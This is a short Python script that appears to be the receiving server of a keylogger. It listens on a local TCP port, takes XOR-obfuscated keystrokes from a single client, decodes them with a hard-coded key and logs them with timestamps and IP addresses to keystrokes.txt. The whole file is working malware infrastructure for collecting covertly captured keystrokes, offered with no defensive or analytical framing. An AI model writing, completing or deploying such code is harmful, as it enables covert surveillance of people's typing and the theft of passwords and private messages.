import socket
from datetime import datetime


# XOR decryption function
def xor_decrypt(encrypted_message, key):
    decrypted_message = []
    for i in range(len(encrypted_message)):
        char = encrypted_message[i]
        key_char = key[i % len(key)]  # Repeat key if shorter than message
        decrypted_char = chr(ord(char) ^ ord(key_char))
        decrypted_message.append(decrypted_char)
    return ''.join(decrypted_message)


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_host = '127.0.0.1'
server_port = 12345
server_socket.bind((server_host, server_port))

server_socket.listen(1)

try:
    client_socket, client_address = server_socket.accept()

    file_name = 'keystrokes.txt'
    with open(file_name, 'a') as f:
        server_ip = server_socket.getsockname()[0]
        client_ip = client_address[0]
        f.write(f"Server IP: {server_ip}\n")
        f.write(f"Client IP: {client_ip}\n\n")

        while True:
            encrypted_keystroke = client_socket.recv(1024).decode()
            if not encrypted_keystroke:
                break

            # Decrypt received keystroke using XOR with the same key
            decrypted_keystroke = xor_decrypt(encrypted_keystroke, 'encryption_key')

            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            formatted_keystroke = f"\t{timestamp} - {decrypted_keystroke}\n"

            f.write(formatted_keystroke)
            f.flush()

finally:
    client_socket.close()
    server_socket.close()
